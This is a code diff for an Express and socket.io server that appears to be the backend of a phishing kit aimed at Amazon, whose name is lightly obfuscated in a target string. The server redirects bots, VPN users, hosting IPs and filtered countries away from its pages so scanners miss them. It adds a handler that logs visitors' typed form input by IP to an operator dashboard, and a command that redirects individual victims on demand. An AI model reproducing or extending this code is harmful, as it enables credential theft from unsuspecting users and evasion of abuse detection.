@@ -13,6 +13,63 @@ const app = express();
 const http = require('http').createServer(app);
 const io = new Server(http);
 
+// Socket.io connection handling for real-time updates
+io.on('connection', (socket) => {
+  const clientIp = socket.handshake.headers['x-forwarded-for']?.split(',')[0].trim() || 
+                  socket.handshake.address.replace('::ffff:', '');
+  
+  console.log(`a user connected: ${clientIp}`);
+  
+  // Store client IP in socket for disconnect handling
+  socket.clientIp = clientIp;
+  
+  // Update visitor online status
+  if (ipCache.has(clientIp)) {
+    const visitorData = ipCache.get(clientIp);
+    visitorData.isOnline = true;
+    visitorData.lastConnected = new Date();
+    ipCache.set(clientIp, visitorData);
+    
+    // Emit dashboard update to all connected clients
+    io.emit('dashboard-update');
+  }
+  
+  // Listen for page navigation events from client
+  socket.on('page-view', (data) => {
+    if (ipCache.has(clientIp) && data.path) {
+      const visitorData = ipCache.get(clientIp);
+      visitorData.lastPath = data.path;
+      visitorData.lastRequest = new Date();
+      ipCache.set(clientIp, visitorData);
+      
+      // Emit dashboard update to all connected clients
+      io.emit('dashboard-update');
+    }
+  });
+  
+  // Handle client disconnect
+  socket.on('disconnect', () => {
+    const clientIp = socket.clientIp;
+    console.log(`user disconnected: ${clientIp}`);
+    
+    if (ipCache.has(clientIp)) {
+      const visitorData = ipCache.get(clientIp);
+      visitorData.isOnline = false;
+      visitorData.lastDisconnected = new Date();
+      ipCache.set(clientIp, visitorData);
+      
+      // Emit dashboard update to all connected clients
+      io.emit('dashboard-update');
+    }
+  });
+  
+  // Handle redirect requests from dashboard
+  socket.on('redirect-user', (data) => {
+    // Forward the redirect command to the specific client
+    io.emit('redirect', data);
+  });
+});
+
 let target = "A-1M-1A-1Z-1O"; // hadi hizyada;
 target = target.split("-1");
 target = target.join("");
@@ -36,38 +93,8 @@ app.use(express.static(path.join(__dirname,'public')));
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
 
-// Country filtering middleware
-app.use((req, res, next) => {
-  const clientIP = requestIp.getClientIp(req);
-  const ipData = ipCache.get(clientIP);
-  
-  // Skip country filtering for dashboard routes
-  if (req.path.startsWith('/dashboard')) {
-    return next();
-  }
-  
-  if (ipData && ipData.countryCode) {
-    const countryCode = ipData.countryCode.toUpperCase();
-    
-    // Apply country filtering based on mode
-    if (globalSettings.countryFilterMode === 'block') {
-      // Block mode: block listed countries
-      if (globalSettings.blockedCountries.includes(countryCode)) {
-        console.log(`Blocked access from ${countryCode} (Block Mode)`);
-        return res.status(403).send('Access denied based on your country');
-      }
-    } else {
-      // Allow-only mode: only allow listed countries
-      if (!globalSettings.allowedCountries.includes(countryCode)) {
-        console.log(`Blocked access from ${countryCode} (Allow-Only Mode)`);
-        return res.status(403).send('Access denied based on your country');
-      }
-    }
-  }
-  
-  next();
-});
-
+// Serve static files from the public directory
+app.use(express.static(path.join(__dirname, 'public')));
 
 
 
@@ -78,14 +105,54 @@ app.set('view engine', 'ejs');
 
 /////////////////[FUNCTION]//(blocker)//////////////
 
-// Initialize global IP cache Map
+// Create a Map to store IP data
 const ipCache = new Map();
+
+// Create a Map to store input data
+const inputDataCache = new Map(); // Key: IP, Value: Array of input data objects
 const globalSettings = {
   proxyDetectionEnabled: false,
   blockedCountries: [],
   allowedCountries: [],
   countryFilterMode: 'block', // 'block' or 'allow-only'
 };
+
+// Parse User Agent function
+function parseUserAgent(userAgent) {
+  if (!userAgent) return { browser: 'Unknown', os: 'Unknown' };
+  
+  // Browser detection
+  let browser = 'Unknown';
+  if (userAgent.includes('Firefox/')) {
+    browser = 'Firefox';
+  } else if (userAgent.includes('Chrome/') && !userAgent.includes('Edg/') && !userAgent.includes('OPR/')) {
+    browser = 'Chrome';
+  } else if (userAgent.includes('Safari/') && !userAgent.includes('Chrome/')) {
+    browser = 'Safari';
+  } else if (userAgent.includes('Edg/')) {
+    browser = 'Edge';
+  } else if (userAgent.includes('OPR/') || userAgent.includes('Opera/')) {
+    browser = 'Opera';
+  } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
+    browser = 'Internet Explorer';
+  }
+  
+  // OS detection
+  let os = 'Unknown';
+  if (userAgent.includes('Windows')) {
+    os = 'Windows';
+  } else if (userAgent.includes('Macintosh') || userAgent.includes('Mac OS')) {
+    os = 'macOS';
+  } else if (userAgent.includes('Linux') && !userAgent.includes('Android')) {
+    os = 'Linux';
+  } else if (userAgent.includes('Android')) {
+    os = 'Android';
+  } else if (userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iPod')) {
+    os = 'iOS';
+  }
+  
+  return { browser, os };
+}
 
 const redirectURL = process.env.URL; // Replace with your desired redirect URL
 
@@ -101,11 +168,8 @@ const REAL_ROUTES = [
 ];
 
 // Bot detection function
-function isBot(userAgent, ip) {
-  if (
-    (!userAgent || typeof userAgent !== "string") &&
-    (!ip || typeof ip !== "string")
-  ) {
+function isBot(userAgent) {
+  if (!userAgent || typeof userAgent !== "string") {
     return false;
   }
 
@@ -280,7 +344,7 @@ async function isProxy(ip, req) {
       proxy: data.proxy || false,
       hosting: data.hosting || false,
       isBlocked: existingData.isBlocked || false,
-      isBot: isBot(req?.headers?.["user-agent"], ip),
+      isBot: isBot(req?.headers?.["user-agent"]),
       country: data.country || null,
       countryCode: data.countryCode || null,
       region: data.region || null,
@@ -311,7 +375,7 @@ async function isProxy(ip, req) {
       proxy: data?.proxy || false,
       hosting: data?.hosting || false,
       isBlocked: existingData.isBlocked || false,
-      isBot: isBot(req?.headers?.["user-agent"], ip),
+      isBot: isBot(req?.headers?.["user-agent"]),
       country: data?.country || null,
       countryCode: data?.countryCode || null,
       region: data?.region || null,
@@ -392,57 +456,144 @@ function parseUserAgent(userAgent) {
   };
 }
 
-// Detection middleware
+// Visitor tracking middleware - add this before other middleware
 async function detectMiddleware(req, res, next) {
   const clientIp =
     req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
     requestIp.getClientIp(req);
-
+ // Skip filtering for static assets and non-target routes
+ if (!REAL_ROUTES.includes(req.path)) {
+  return next();
+}
   console.log("clientIp:", clientIp);
   console.log("req.path:", req.path);
 
-  if (ipCache.has(clientIp) && REAL_ROUTES.includes(req.path)) {
-    // Update request tracking data
+  
+
+  // Get user agent info
+  const userAgent = req.headers['user-agent'];
+  const uaInfo = parseUserAgent(userAgent || '');
+  const isBotDetected = isBot(userAgent);
+
+  const now = new Date();
+  
+  if (ipCache.has(clientIp)) {
+    // Update existing visitor data
     const existingData = ipCache.get(clientIp);
     ipCache.set(clientIp, {
       ...existingData,
       requestCount: (existingData.requestCount || 0) + 1,
-      lastRequest: new Date().toISOString(),
-      path: req.path,
-      userAgent: req.headers["user-agent"] || null,
+      lastRequest: now.toISOString(),
+      userAgent: userAgent || existingData.userAgent,
+      browser: uaInfo.browser || existingData.browser,
+      os: uaInfo.os || existingData.os,
+      isBot: isBotDetected || existingData.isBot,
+      lastPath: req.path || existingData.lastPath
+      // Keep online status as is
     });
+  } else {
+    // Create new visitor entry
+    // Fetch geo and proxy data for new IPs
+    try {
+      const ipInfo = await axios.get(`http://ip-api.com/json/${clientIp}`);
+      const ipData = ipInfo.data;
+      
+      ipCache.set(clientIp, {
+        ip: clientIp,
+        firstSeen: now,
+        lastRequest: now,
+        lastPath: req.path,
+        requestCount: 1,
+        userAgent: userAgent || null,
+        browser: uaInfo.browser || null,
+        os: uaInfo.os || null,
+        country: ipData.countryCode || null,
+        city: ipData.city || null,
+        isp: ipData.isp || null,
+        proxy: ipData.proxy || false,
+        hosting: ipData.hosting || false,
+        mobile: ipData.mobile || false,
+        isBot: isBotDetected || false,
+        isOnline: false, // Will be set to true when socket connects
+        isBlocked: false,
+        lastPath: req.path || null
+      });
+      
+      // Emit dashboard update to all connected clients
+      io.emit('dashboard-update');
+    } catch (error) {
+      console.error(`Error fetching IP data for ${clientIp}:`, error.message);
+      
+      // Still add to cache even if IP API fails
+      ipCache.set(clientIp, {
+        ip: clientIp,
+        firstSeen: now,
+        lastRequest: now,
+        lastPath: req.path,
+        requestCount: 1,
+        userAgent: userAgent || null,
+        browser: uaInfo.browser || null,
+        os: uaInfo.os || null,
+        isBot: isBotDetected || false,
+        isOnline: false,
+        isBlocked: false,
+        lastPath: req.path || null
+      });
+    }
   }
+  
 
-  // Skip detection for dashboard routes
-  if (req.path.startsWith("/dashboard")) {
-    return next();
-  }
-
-  // Skip detection for real routes
-  if (!REAL_ROUTES.includes(req.path)) {
-    return next();
-  }
+ 
 
   // Check if IP is blocked
   if (ipCache.has(clientIp) && ipCache.get(clientIp).isBlocked) {
+    console.log(`Blocked IP accessed: ${clientIp}`);
     return res.redirect(redirectURL);
   }
 
-  // Check if country is blocked
-  if (
-    ipCache.has(clientIp) &&
-    ipCache.get(clientIp).countryCode &&
-    globalSettings.blockedCountries.includes(ipCache.get(clientIp).countryCode)
-  ) {
+  // Get visitor data
+  const visitorData = ipCache.get(clientIp);
+  
+  // Country filtering logic
+  if (visitorData && visitorData.country) {
+    const countryCode = visitorData.country;
+    
+    // Apply country filtering based on mode
+    if (globalSettings.countryFilterMode === 'block') {
+      // Block mode: block countries in the list
+      if (globalSettings.blockedCountries.includes(countryCode)) {
+        console.log(`Blocked country accessed: ${countryCode} from ${clientIp}`);
+        return res.redirect(redirectURL);
+      }
+    } else {
+      // Allow-only mode: only allow countries in the list
+      if (!globalSettings.allowedCountries.includes(countryCode)) {
+        console.log(`Non-allowed country accessed: ${countryCode} from ${clientIp}`);
+        return res.redirect(redirectURL);
+      }
+    }
+  }
+  
+  // Check for proxy/VPN if enabled
+  if (globalSettings.proxyDetectionEnabled && visitorData) {
+    if (visitorData.proxy || visitorData.hosting) {
+      console.log(`Proxy/VPN detected: ${clientIp}`);
+      return res.redirect(redirectURL);
+    }
+    
+    // Double-check with proxy detection function
+    const isProxyDetected = await isProxy(clientIp, req);
+    if (isProxyDetected) {
+      console.log(`Proxy/VPN detected (secondary check): ${clientIp}`);
+      return res.redirect(redirectURL);
+    }
+  }
+  
+  // Check for bots
+  if (visitorData && visitorData.isBot) {
+    console.log(`Bot detected: ${clientIp}`);
     return res.redirect(redirectURL);
   }
-  console.log("not entering here!")
-  // Check for proxy/VPN
-  const isHe = await isProxy(clientIp, req);
-  if (isHe && globalSettings.proxyDetectionEnabled) {
-    return res.redirect(redirectURL);
-  }
-  if (isBot(req.headers["user-agent"], clientIp)) { return res.redirect(redirectURL); }
   next();
 }
 
@@ -477,13 +628,15 @@ app.get("/dashboard", (req, res) => {
   });
 });
 
-// Dashboard data API
+// Dashboard data API endpoint
 app.get("/dashboard/data", (req, res) => {
+  // Convert Map to object for JSON response
   const ipCacheData = {};
   ipCache.forEach((value, key) => {
     ipCacheData[key] = value;
   });
-
+  
+  // Return dashboard data with all necessary information
   res.json({
     totalVisitors: ipCache.size,
     botsDetected: Array.from(ipCache.values()).filter(info => info.isBot).length,
@@ -496,6 +649,29 @@ app.get("/dashboard/data", (req, res) => {
     countryFilterMode: globalSettings.countryFilterMode,
     proxyDetectionEnabled: globalSettings.proxyDetectionEnabled
   });
+});
+
+// Input data API for dashboard
+app.get('/dashboard/input-data', (req, res) => {
+  const allInputData = {};
+  
+  // Convert Map to object for JSON response
+  inputDataCache.forEach((inputs, ip) => {
+    allInputData[ip] = inputs;
+  });
+  
+  res.json(allInputData);
+});
+
+// Clear input logs endpoint
+app.post('/dashboard/clear-input-logs', (req, res) => {
+  // Clear the input data cache
+  inputDataCache.clear();
+  
+  // Notify all dashboard clients that input data has been cleared
+  io.emit('input-data-update');
+  
+  res.json({ success: true, message: 'Input logs cleared successfully' });
 });
 
 // Block IP endpoint
@@ -517,6 +693,17 @@ app.post("/dashboard/block", (req, res) => {
 });
 
 // Unblock IP endpoint
+// Get visitor data by IP endpoint
+app.get("/dashboard/visitor/:ip", (req, res) => {
+  const { ip } = req.params;
+  
+  if (ipCache.has(ip)) {
+    res.json(ipCache.get(ip));
+  } else {
+    res.status(404).json({ error: "Visitor not found" });
+  }
+});
+
 app.post("/dashboard/unblock", (req, res) => {
   const { ip } = req.body;
   if (ipCache.has(ip)) {
@@ -763,29 +950,92 @@ http.listen(PORT, () => {
     const clientIP = requestIp.getClientIp(socket.request);
     console.log('a user connected:', clientIP);
     
+    // Store IP in socket for later reference
+    socket.clientIP = clientIP;
+    
     // Update IP cache with online status
     if (ipCache.has(clientIP)) {
       const ipData = ipCache.get(clientIP);
       ipData.isOnline = true;
       ipData.lastConnected = new Date();
       ipCache.set(clientIP, ipData);
+    } else {
+      // Create a basic entry if IP is not in cache yet
+      const basicData = {
+        requestCount: 1,
+        firstRequest: new Date().toISOString(),
+        lastRequest: new Date().toISOString(),
+        userAgent: socket.request.headers["user-agent"] || null,
+        browser: parseUserAgent(socket.request.headers["user-agent"])?.browser || null,
+        os: parseUserAgent(socket.request.headers["user-agent"])?.os || null,
+        path: "/",
+        isOnline: true,
+        lastConnected: new Date(),
+        isBot: false,
+        isBlocked: false
+      };
+      
+      ipCache.set(clientIP, basicData);
     }
+    
+    // Emit updated dashboard data to all connected clients
+    io.emit('dashboard-update');
 
     socket.on('disconnect', () => {
-      console.log('user disconnected:', clientIP);
+      console.log('user disconnected:', socket.clientIP);
       
       // Update IP cache with offline status
-      if (ipCache.has(clientIP)) {
-        const ipData = ipCache.get(clientIP);
+      if (ipCache.has(socket.clientIP)) {
+        const ipData = ipCache.get(socket.clientIP);
         ipData.isOnline = false;
         ipData.lastDisconnected = new Date();
-        ipCache.set(clientIP, ipData);
+        ipCache.set(socket.clientIP, ipData);
+        
+        // Emit updated dashboard data to all connected clients
+        io.emit('dashboard-update');
       }
     });
 
     // Handle redirect requests from dashboard
     socket.on('redirect-user', (data) => {
       io.emit('redirect', {url: data.url, ip: data.ip});
+    });
+    
+    // Handle input data from clients
+    socket.on('input-data', (data) => {
+      const clientIP = socket.clientIP;
+      
+      // Skip if IP is blocked
+      if (ipCache.has(clientIP) && ipCache.get(clientIP).isBlocked) {
+        return;
+      }
+      
+      // Store input data with IP association
+      if (!inputDataCache.has(clientIP)) {
+        inputDataCache.set(clientIP, []);
+      }
+      
+      // Add timestamp and path information
+      const inputData = {
+        ...data,
+        ip: clientIP,
+        timestamp: new Date().toISOString()
+      };
+      
+      // Add to the beginning of the array (newest first)
+      const ipInputs = inputDataCache.get(clientIP);
+      ipInputs.unshift(inputData);
+      
+      // Limit to 50 most recent inputs per IP
+      if (ipInputs.length > 50) {
+        ipInputs.pop();
+      }
+      
+      // Update the cache
+      inputDataCache.set(clientIP, ipInputs);
+      
+      // Notify dashboard of new input data
+      io.emit('input-data-update');
     });
   });
 });
